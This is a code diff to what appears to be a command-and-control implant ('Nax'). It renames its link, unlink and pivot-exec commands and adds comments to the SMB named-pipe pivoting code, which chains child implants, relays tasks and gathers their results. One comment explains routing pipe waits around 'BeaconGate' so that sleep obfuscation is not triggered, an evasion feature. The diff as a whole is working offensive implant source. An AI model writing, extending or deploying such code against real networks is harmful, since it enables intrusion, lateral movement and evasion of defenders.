@@ -30,7 +30,7 @@ FUNC VOID NaxPostPivotHeaderRead( PNAX_INSTANCE Nax, NAX_PIVOT* p ) {
 
 /* ========= [ CMD_LINK ] ========= */
 
-FUNC INT CmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     if ( args_len < 6 )
         return NAX_ERR_INVAL;
 
@@ -43,6 +43,7 @@ FUNC INT CmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 arg
     MmZero( pipePath, 520 );
     MmCopy( pipePath, args + 5, nameLen );
 
+    /* connect to child's pipe */
     HANDLE hPipe = Nax->Kernel32.CreateFileA( pipePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL );
     if ( hPipe == INVALID_HANDLE_VALUE ) {
         *(UINT32*)out = Nax->Kernel32.GetLastError();
@@ -50,6 +51,7 @@ FUNC INT CmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 arg
         return NAX_ERR_NET;
     }
 
+    /* set message mode */
     DWORD dwMode = PIPE_READMODE_MESSAGE;
     Nax->Kernel32.SetNamedPipeHandleState( hPipe, &dwMode, NULL, NULL );
 
@@ -82,6 +84,7 @@ FUNC INT CmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 arg
     }
     Nax->Ntdll.NtClose( hTempEvent );
 
+    /* allocate async I/O state */
     NAX_PIVOT_ASYNC* async = (NAX_PIVOT_ASYNC*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_PIVOT_ASYNC ) );
     if ( ! async ) {
         Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, beatBuf );
@@ -92,6 +95,7 @@ FUNC INT CmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 arg
     async->OvRead.hEvent = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );
     async->hWriteEvent   = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );
 
+    /* allocate pivot entry */
     NAX_PIVOT* pivot = (NAX_PIVOT*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_PIVOT ) );
     if ( ! pivot ) {
         Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, async );
@@ -106,6 +110,7 @@ FUNC INT CmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 arg
     pivot->Next  = Nax->PivotHead;
     Nax->PivotHead = pivot;
 
+    /* arm the first async header read */
     NaxPostPivotHeaderRead( Nax, pivot );
 
     /* result: linkType(1) | watermark(4LE) | sessionId(16) | encrypted_data */
@@ -128,7 +133,7 @@ FUNC INT CmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 arg
 
 /* ========= [ CMD_UNLINK ] ========= */
 
-FUNC INT CmdUnlink( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdUnlink( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     if ( args_len < 4 )
         return NAX_ERR_INVAL;
 
@@ -166,7 +171,7 @@ FUNC INT CmdUnlink( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE 
 
 /* ========= [ CMD_PIVOT_EXEC ] ========= */
 
-FUNC INT CmdPivotExec( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdPivotExec( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     if ( args_len < 8 )
         return NAX_ERR_INVAL;
 
@@ -175,6 +180,8 @@ FUNC INT CmdPivotExec( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBY
     if ( 8 + dataLen > args_len )
         return NAX_ERR_INVAL;
 
+    /* server sends empty pivot data when child has no tasks - skip the write
+     * so we don't push a 0-length header that kills the child's pipe loop */
     if ( dataLen == 0 ) {
         *out_len = 0;
         return NAX_OK;
@@ -198,11 +205,19 @@ FUNC INT CmdPivotExec( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBY
 
 /* ========= [ ProcessPivots - collect child responses ] ========= */
 
+/* Output format: concatenated entries, each: entry_len(4LE) | type(1) | body
+ * type 0 = pivot data:  pivot_id(4) | data_len(4) | data
+ * type 1 = auto-unlink: pivot_id(4) | disconnect_type(1)
+ * Caller iterates entries and sends each as a separate result POST. */
 
 FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
     UINT32 written = 0;
     NAX_PIVOT** pp = &Nax->PivotHead;
 
+    /* Bypass BeaconGate for pivot waits - the gated WaitForSingleObject
+     * routes through sleep_mask which triggers sleep obfuscation when
+     * timeout >= threshold.  Pivot waits are short synchronous polls for
+     * child pipe data, not beacon sleep - they must never trigger it. */
     typedef DWORD (WINAPI *FN_WFSO)( HANDLE, DWORD );
     FN_WFSO realWfso = (FN_WFSO)Nax->Kernel32.WaitForSingleObject;
     for ( UINT32 i = 0; i < Nax->GateSwaps.Count; i++ ) {
@@ -222,6 +237,11 @@ FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
             goto _cleanup;
         }
 
+        /* Wait synchronously so child responses are collected in the
+         * same relay cycle before the output goes out.  2 s covers slow
+         * BOFs (whoami enumerating groups/privileges via LookupAccountSid)
+         * and multi-hop SMB chains where the intermediary must wait for
+         * grandchildren before relaying results to the parent. */
         DWORD  waitMs   = 0;
         UINT64 deadline = 0;
         if ( p->Async->DataSent ) {
@@ -231,6 +251,7 @@ FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
         }
         p->Async->DataSent = FALSE;
 
+        /* collect available messages */
         UINT32 msgCount = 0;
         while ( 1 ) {
             DWORD w = realWfso( p->Async->OvRead.hEvent, waitMs );
@@ -251,6 +272,7 @@ FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
             UINT32 msgLen = p->Async->RdHeader;
             if ( msgLen == 0 || msgLen > 0x1000000 ) { broken = TRUE; break; }
 
+            /* read message body */
             PBYTE msgBuf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, msgLen );
             if ( ! msgBuf ) { broken = TRUE; break; }
 
@@ -263,6 +285,7 @@ FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
             msgCount++;
             NaxDbg( Nax, "[pivot] read msg #%u from pivot %08x (%u bytes)", msgCount, p->Id, msgLen );
 
+            /* entry: entry_len(4) | type(1)=DATA | pivot_id(4) | data_len(4) | data */
             UINT32 entryBody = 1 + 4 + 4 + msgLen;
             if ( written + 4 + entryBody <= out_cap ) {
                 PBYTE cur = out + written;
@@ -275,6 +298,8 @@ FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
             }
             Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, msgBuf );
 
+            /* Recompute wait from remaining budget so stale heartbeats
+             * in the pipe don't starve deeper relay chains. */
             if ( deadline ) {
                 UINT64 now = Nax->Kernel32.GetTickCount64();
                 waitMs = ( now >= deadline ) ? 0 : (DWORD)( deadline - now );
@@ -282,6 +307,7 @@ FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
             if ( waitMs > 100 )
                 waitMs = 100;
 
+            /* arm next header read */
             NaxPostPivotHeaderRead( Nax, p );
             if ( ! p->Async->RdPending ) break;
         }
@@ -296,6 +322,7 @@ FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
                 Nax->Ntdll.NtClose( p->Async->hWriteEvent );
             Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, p->Async );
 
+            /* entry: entry_len(4) | type(1)=UNLINK | pivot_id(4) | disconnect_type(1) */
             UINT32 entryBody = 1 + 4 + 1;
             if ( written + 4 + entryBody <= out_cap ) {
                 PBYTE cur = out + written;
